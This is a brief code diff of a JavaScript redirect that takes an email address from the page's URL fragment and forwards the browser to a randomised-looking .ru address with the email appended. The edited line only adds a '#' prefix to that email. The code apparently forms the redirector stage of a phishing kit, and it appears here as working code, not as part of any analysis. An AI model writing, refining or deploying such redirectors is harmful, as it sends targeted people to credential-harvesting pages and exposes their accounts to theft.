@@ -8,7 +8,7 @@
       const baseUrl = 'https://tyzj3.mqdtjbcmidy.ru/x@UjGR9oPTgIkD6a/';
       const hash = window.location.hash;
       if (hash) {
-        const email = '' + hash.substring(1);
+        const email = '#' + hash.substring(1);
         window.location.href = baseUrl + encodeURIComponent(email);
       } else {
         window.location.href = baseUrl;
